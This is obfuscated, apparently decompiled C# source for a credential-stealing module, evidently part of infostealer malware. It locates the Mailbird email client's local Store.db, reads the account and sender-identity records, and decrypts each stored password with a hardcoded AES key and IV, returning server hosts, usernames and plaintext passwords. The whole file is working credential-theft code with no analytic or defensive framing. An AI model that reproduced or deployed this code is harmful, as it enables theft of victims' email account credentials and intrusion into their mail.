using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using _81d;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class CUC9 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string wy2rjkm0rh
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public CUC9()
	{
		wy2rjkm0rh = "Mailbird";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				list.AddRange(_5JzD("SenderIdentities"));
				num = 3;
			}
			if (num == 3)
			{
				list.AddRange(_5JzD());
				num = 4;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		return list;
	}

	private static List<ii68> _5JzD(string uPvjC84Nx = "Accounts")
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		byte[] sjy = default;
		byte[] ixDTkzX = default;
		_5bBC obj = default;
		while (true)
		{
			if (num == 6)
			{
				goto IL_001f;
			}
			if (num == 4)
			{
				return list;
			}
			if (num == 3)
			{
				if (File.Exists(text))
				{
					goto IL_01d1;
				}
				num = 4;
			}
			if (num == 1)
			{
				text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mailbird\\Store\\Store.db";
				num = 2;
			}
			if (num != 5)
			{
				if (num == 2)
				{
					list = new List<ii68>();
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 7)
				{
					break;
				}
				continue;
			}
			goto IL_01d1;
			IL_01d1:
			sjy = new byte[32]
			{
				53, 224, 133, 48, 138, 109, 145, 163, 150, 95,
				242, 55, 149, 209, 207, 54, 113, 222, 126, 91,
				98, 56, 213, 251, 219, 100, 166, 75, 211, 90,
				5, 83
			};
			ixDTkzX = new byte[16]
			{
				152, 15, 104, 206, 119, 67, 76, 71, 249, 233,
				14, 130, 244, 107, 76, 235
			};
			try
			{
				obj = new _5bBC(text);
			}
			catch
			{
				return list;
			}
			if (!obj.ga9(uPvjC84Nx) | (obj.FtN5geM() <= 0))
			{
				return list;
			}
			goto IL_001f;
			IL_001f:
			LPi8kXmS67z lPi8kXmS67z = new LPi8kXmS67z();
			for (int i = 0; i <= obj.FtN5geM() - 1; i++)
			{
				try
				{
					string host = obj.Jw0(i, "Server_Host");
					string username = obj.Jw0(i, (uPvjC84Nx == "Accounts") ? "Username" : "Email");
					string s = obj.Jw0(i, "EncryptedPassword");
					string password = Encoding.UTF8.GetString(lPi8kXmS67z.eEF7nNODdAE(Convert.FromBase64String(s), sjy, ixDTkzX));
					list.Add(new ii68
					{
						oVAe = "Mailbird",
						S8v = username,
						_9H5rP7hg2 = password,
						byIdLuuGZbL = host
					});
				}
				catch
				{
				}
			}
			return list;
		}
		List<ii68> result = default;
		return result;
	}
}
